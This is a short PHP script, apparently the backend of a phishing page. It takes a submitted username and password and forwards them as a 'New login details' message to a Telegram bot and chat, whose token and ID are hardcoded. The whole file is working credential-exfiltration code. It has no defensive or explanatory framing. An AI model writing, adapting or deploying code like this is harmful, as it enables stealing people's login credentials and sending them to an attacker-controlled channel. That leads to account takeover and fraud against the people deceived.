<?php
// Replace with your Telegram bot token and chat ID
$token = '7007663719:AAHWGKMrYMC3BgXv2te6K8BGaHNN0Vr8iQA';
$chat_id = '-1002162970418';

// Get username and password from POST data (example)
$username = $_POST['username'];
$password = $_POST['password'];

// Construct the message
$message = "New login details:\nUsername: $username\nPassword: $password";

// Telegram API endpoint URL
$url = "https://api.telegram.org/bot$token/sendMessage";

// Parameters for the HTTP POST request to Telegram API
$params = [
    'chat_id' => $chat_id,
    'text' => $message,
];

// Initialize cURL session
$ch = curl_init($url);

// Set cURL options
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL session and close
$response = curl_exec($ch);
curl_close($ch);

// Check if the message was sent successfully
if (!$response) {
    // Handle error
    echo "Message sending failed.";
} else {
    // Message sent successfully
    echo "Message sent successfully.";
}
?>
